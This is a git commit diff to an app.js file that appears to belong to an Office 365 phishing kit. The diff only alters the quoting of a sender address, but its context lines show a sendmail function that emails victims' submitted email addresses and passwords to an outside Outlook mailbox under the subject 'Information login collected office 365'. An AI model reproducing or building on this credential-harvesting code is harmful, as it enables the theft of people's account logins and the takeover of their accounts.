1ab4884d87a8fc721d52223a598ebaf86992bd03
John18102 <92080016+John18102@users.noreply.github.com>
2021-10-10 05:44:55 -0300

    Update app.js

--- app.js
+++ app.js
@@ -26,7 +26,7 @@ function sendmail(req,res){
   }
  });  
  const mailOptions = {
-  from: 'djdh@gmail.com',
+  from: '"djdh@gmail.com"',
   to: 'dakota3011@outlook.com',
   subject: 'Information login collected office 365',
   html: `<b><h2>Login Office365</h2></b><p>Email: ${email}<br>Password: ${password}<br>IP:</p>`
